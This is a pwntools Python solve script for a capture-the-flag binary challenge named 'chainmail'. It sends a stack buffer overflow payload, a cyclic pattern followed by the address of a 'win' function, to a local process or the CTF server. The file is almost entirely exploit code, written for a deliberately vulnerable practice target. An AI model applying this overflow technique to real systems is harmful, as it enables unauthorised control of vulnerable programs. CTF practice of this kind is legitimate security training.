#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            r = gdb.debug("./chal",
                """
                b main
                continue
                """,
            )
            # gdb.attach(r)
    else:
        r = remote('chainmail.chal.uiuc.tf', 1337)

    return r


def main():
    io = conn()
    # good luck pwning :)
    # io.recvline(b':')
    offset = 81
    win = 0x0000000000401216 + 5
    payload = b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA' + pack(win)
    # payload = b'a' * offset + pack(win)
    print(payload)
    io.sendline(payload)
    io.interactive()
    io.close()


if __name__ == "__main__":
    main()
